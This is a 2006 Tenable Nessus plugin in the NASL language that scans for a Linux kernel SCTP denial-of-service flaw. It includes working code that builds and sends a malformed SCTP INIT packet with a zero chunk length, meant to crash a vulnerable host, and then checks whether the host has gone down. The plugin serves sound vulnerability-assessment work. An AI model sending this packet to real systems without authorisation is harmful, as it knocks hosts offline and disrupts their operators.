#
# (C) Tenable Network Security
#

if ( NASL_LEVEL < 2204 ) exit(0);

if (description) {
  script_id(21333);
  script_version("$Revision: 1.8 $");

  script_cve_id("CVE-2006-1527", "CVE-2006-2934", "CVE-2006-3085");
  script_bugtraq_id(17806, 18550, 18755);
  if (defined_func("script_xref")) 
  {
    script_xref(name:"OSVDB", value:"25229");
    script_xref(name:"OSVDB", value:"26680");
    script_xref(name:"OSVDB", value:"26963");
  }

  script_name(english:"Linux SCTP chunk header length Denial of Service Vulnerability");
  script_summary(english:"Sends an SCTP packet with a chunk header of length 0");
 
  desc = "
Synopsis :

It is possible to crash the remote host by sending it a malformed SCTP
packet. 

Description :

There is a flaw in the Linux kernel on the remote host that causes a
kernel panic when it receives an SCTP packet with a chunk data packet
of length 0.  An attacker can leverage this flaw to crash the remote
host. 

Note that successful exploitation of this issue requires that the
kernel support SCTP protocol connection tracking. 

See also :

http://lists.netfilter.org/pipermail/netfilter-devel/2006-May/024241.html
http://www.kernel.org/pub/linux/kernel/v2.6/ChangeLog-2.6.16.13
http://www.kernel.org/pub/linux/kernel/v2.6/ChangeLog-2.6.17.1
http://www.kernel.org/pub/linux/kernel/v2.6/ChangeLog-2.6.16.23
http://www.kernel.org/pub/linux/kernel/v2.6/ChangeLog-2.6.17.3

Solution :

Upgrade to Linux kernel 2.6.16.23 / 2.6.17.3 or later. 

Risk factor : 

Low / CVSS Base Score : 3.3
(AV:R/AC:L/Au:NR/C:N/I:N/A:C/B:N)";
  script_description(english:desc);
 
  script_category(ACT_KILL_HOST);
  script_family(english:"Denial of Service");

  script_copyright(english:"This script is Copyright (C) 2006 Tenable Network Security");

  exit(0);
}


include("raw.inc");


if (islocalhost()) exit(0);
if (!get_host_open_port()) exit(0);


# Construct a malicious SCTP packet.
sctp = 
  # SCTP header
  mkword(rand()) +                     # source port
  mkword(rand()) +                     # destination port
  mkdword(0) +                         # verification tag
  mkdword(0) +                         # checksum (to be added later)

  # SCTP chunk 1
  mkbyte(1) +                          # type (1 => INIT)
  mkbyte(0) +                          # flags
  mkbyte(0);                           # length (0 => boom!)
chksum = inet_sum(sctp);
ip = ip(ip_p:132);                     # SCTP
sctp = payload(insstr(sctp, mkdword(chksum), 8, 11));
boom = mkpacket(ip, sctp);


# Send packet and check whether the host is down.
start_denial();
send_packet(boom, pcap_active:FALSE);
alive = end_denial();
if (!alive)
{
  set_kb_item(name:"Host/dead", value:TRUE);
  security_note(0);
}
